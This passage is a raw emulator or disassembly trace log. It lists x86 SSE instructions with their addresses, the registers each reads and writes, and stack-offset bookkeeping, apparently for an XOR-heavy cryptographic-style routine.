-0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422be3: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x422be6: movaps xmm7, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422c09: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x422c10: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422c1a: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x422c21: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x422c29: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422c2d: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x422c34: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422c3d: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x422c40: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422c54: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x422c5b: movaps xmm1, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422c85: mov edx, 8, regs_read: (), regs_write: [24] 0x422c9a: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x422cb8: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x422cbb: movaps xmmword ptr [ebp - 0x430], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422cd2: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x422cd5: pxor xmm0, xmmword ptr [eax + 0x200], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8200 for stack size 0x10000 0x422ce2: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x422ce5: pxor xmm0, xmmword ptr [eax + 0x280], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8280 for stack size 0x10000 0x422ced: movaps xmmword ptr [ebp - 0x420], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422d00: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x422d03: movaps xmmword ptr [ebp - 0x460], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x422d12: movaps xmm3, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422d28: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x422d2b: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x422d36: pxor xmm7, xmm2, regs_read: [129, 124], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422d4b: movaps xmm0, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422d52: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x422d55: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422d59: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x422d79: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422d84: movaps xmmword ptr [ebp - 0x450], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 saving data to stack: 0 16 0x422d93: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x422d96: pxor xmm0, xmmword ptr [ebp - 0x460], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x422d9e: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x422daa: movaps xmmword ptr [ebp - 0x420], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422db1: movaps xmm3, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422dc0: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422dcd: movaps xmmword ptr [ebp - 0x430], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422dd4: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x422de7: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422deb: movaps xmmword ptr [ebp - 0x490], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 saving data to stack: 0 16 0x422dfa: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422dfe: movaps xmmword ptr [ebp - 0x460], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x422e05: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x422e08: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x422e14: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422e1c: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x422e24: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x422e27: pxor xmm6, xmm2, regs_read: [128, 124], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422e2b: movaps xmm2, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422e3e: movaps xmm7, xmm4, regs_read: [126], regs_write: [129] 0x422e41: movaps xmm0, xmmword ptr [ebp - 0x450], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 0x422e50: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x422e67: movaps xmm3, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x422e7a: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x422e85: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422e92: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x422e95: movaps xmmword ptr [ebp - 0x450], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 saving data to stack: 0 16 0x422e9c: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422ea0: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x422eab: movaps xmm2, xmmword ptr [ebp - 0x490], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 0x422ec3: movaps xmm3, xmmword ptr [ebp - 0x490], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 0x422ece: movaps xmmword ptr [ebp - 0x460], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x422edd: movaps xmmword ptr [ebp - 0x430], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422ee4: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x422ee7: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422eeb: movaps xmm6, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422efb: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x422efe: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422f02: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x422f1e: movaps xmmword ptr [ebp - 0x420], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422f2c: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x422f3f: movaps xmm7, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422f46: pxor xmm7, xmmword ptr [ebp - 0x450], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 0x422f5b: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422f68: movaps xmm0, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x422f6f: movaps xmmword ptr [ebp - 0x430], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422f76: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x422f81: movaps xmmword ptr [ebp - 0x420], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422f88: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x422f8b: movaps xmm7, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422fb1: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x422fbb: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422fc2: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x422fc9: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x422fd1: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422fd5: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x422fdc: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422fe5: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x422fe8: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422ffc: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x423003: movaps xmm1, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x42302d: mov edx, dword ptr [ebp - 0x474], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x8 and offset 0x7b8c for stack size 0x10000 0x423033: mov eax, 0x40, regs_read: (), regs_write: [19] 0x423047: pxor xmm0, xmmword ptr [ecx - 0x10], regs_read: [122, 22], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x42305a: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7ffc for stack size 0x10000 0x42305d: pop edi, regs_read: [30], regs_write: [30, 23] 0x423060: pop esi, regs_read: [30], regs_write: [30, 29] 0x423066: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x423068: pop ebp, regs_read: [30], regs_write: [30, 20] 0x423069: mov esp, ebx, regs_read: [21], regs_write: [30] 0x42306b: pop ebx, regs_read: [30], regs_write: [30, 21] 0x423070: push ebx, regs_read: [30, 21], regs_write: [30] 0x423071: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x42307c: push ebp, regs_read: [30, 20], regs_write: [30] 0x42307d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x423080: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x423084: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42308c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x423093: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 64 4 0x423096: mov eax, dword ptr [ebx + 8], regs_read: [21], regs_write: [19] 0x423099: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42309b: mov edx, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [24] 0x4230a3: push esi, regs_read: [30, 29], regs_write: [30] 0x4230aa: mov dword ptr [ebp - 0x444], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7bbc for stack size 0x10000 saving data to stack: 64 4 0x4230b0: push edi, regs_read: [30, 23], regs_write: [30] 0x4230b3: mov edi, 0x40, regs_read: (), regs_write: [23] 0x4230b8: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x4230c8: pxor xmm1, xmmword ptr [ecx - 0x10], regs_read: [123, 22], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x4230d6: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4230e4: mov eax, dword ptr [ebp - 0x444], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7bbc for stack size 0x10000 0x4230ea: mov edi, 8, regs_read: (), regs_write: [23] 0x4230fd: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x423114: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x423117: movaps xmmword ptr [ebp - 0x440], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 0 16 0x42312e: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x423131: pxor xmm0, xmmword ptr [ecx + 0x40], regs_read: [122, 22], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8040 for stack size 0x10000 0x42313b: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42313e: pxor xmm0, xmmword ptr [ecx + 0x50], regs_read: [122, 22], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8050 for stack size 0x10000 0x423143: movaps xmmword ptr [ebp - 0x430], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x423153: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x42316a: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42316d: movaps xmm5, xmm7, regs_read: [129], regs_write: [127] 0x423178: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42318d: movaps xmm0, xmmword ptr [ebp - 0x440], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 0x423194: movaps xmm2, xmm6, regs_read: [128], regs_write: [124] 0x423197: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42319b: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4231b7: movaps xmm0, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x4231be: movaps xmmword ptr [ebp - 0x440], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 0 16 0x4231c5: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4231d8: movaps xmmword ptr [ebp - 0x420], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x4231df: movaps xmm1, xmmword ptr [ebp - 0x440], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 0x4231e6: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x4231ed: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4231fa: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x4231fd: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423212: movaps xmmword ptr [ebp - 0x430], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x423219: movaps xmmword ptr [ebp - 0x460], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x423228: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x423233: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x423236: movaps xmmword ptr [ebp - 0x470], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 saving data to stack: 0 16 0x42323d: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423249: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x42324c: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423250: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42325c: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423260: movaps xmm0, xmmword ptr [ebp - 0x440], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 0x423267: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x42326a: movaps xmm6, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x423275: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x42327d: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x423280: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423284: movaps xmm1, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x423297: movaps xmm2, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x4232c6: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x4232cd: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4232de: movaps xmmword ptr [ebp - 0x460], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x4232e5: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x4232e8: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4232ec: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x4232f7: movaps xmm2, xmmword ptr [ebp - 0x470], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 0x42330b: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x42331e: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x423321: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423325: movaps xmmword ptr [ebp - 0x420], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x42332c: movaps xmm2, xmm7, regs_read: [129], regs_write: [124] 0x42332f: movaps xmm5, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x423336: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42334c: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x42334f: movaps xmmword ptr [ebp - 0x420], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x42335e: movaps xmm5, xmm6, regs_read: [128], regs_write: [127] 0x423361: movaps xmmword ptr [ebp - 0x470], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 saving data to stack: 0 16 0x423378: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x423383: pxor xmm3, xmmword ptr [ebp - 0x460], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x423398: movaps xmm6, xmmword ptr [ebp - 0x470], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 0x4233a7: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4233b8: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x4233c3: movaps xmmword ptr [ebp - 0x460], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x4233ce: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x4233d1: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4233e5: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4233ed: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4233fd: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42340f: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423413: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x423416: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42342a: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x423431: movaps xmm1, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x42345b: mov edi, 8, regs_read: (), regs_write: [23] 0x42346a: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x423488: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42349b: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42349e: pxor xmm0, xmmword ptr [ecx + 0x200], regs_read: [122, 22], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8200 for stack size 0x10000 0x4234ab: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x4234ae: pxor xmm0, xmmword ptr [ecx + 0x280], regs_read: [122, 22], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8280 for stack size 0x10000 0x4234c2: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x4234c5: movaps xmmword ptr [ebp - 0x420], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x4234d4: movaps xmmword ptr [ebp - 0x430], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x4234ea: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4234f5: movaps xmm5, xmm4, regs_read: [126], regs_write: [127] 0x4234f8: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42350d: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x423514: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x423517: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423528: movaps xmm1, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x423537: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x423542: movaps xmmword ptr [ebp - 0x470], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 saving data to stack: 0 16 0x423551: movaps xmm6, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x423558: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42355c: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423572: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x423575: movaps xmmword ptr [ebp - 0x420], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x423584: movaps xmm6, xmm3, regs_read: [125], regs_write: [128] 0x423587: movaps xmmword ptr [ebp - 0x430], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x4235a2: movaps xmmword ptr [ebp - 0x460], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x4235a9: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4235b1: pxor xmm2, xmm6, regs_read: [124, 128], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4235b5: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x4235b8: movaps xmm4, xmm2, regs_read: [124], regs_write: [126] 0x4235cd: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4235d1: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4235d5: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4235e2: movaps xmm5, xmm6, regs_read: [128], regs_write: [127] 0x4235f1: movaps xmm0, xmmword ptr [ebp - 0x470], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 0x4235f8: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4235fb: movaps xmmword ptr [ebp - 0x440], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 0 16 0x42360a: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x42361d: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x423632: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42363f: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x423642: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack 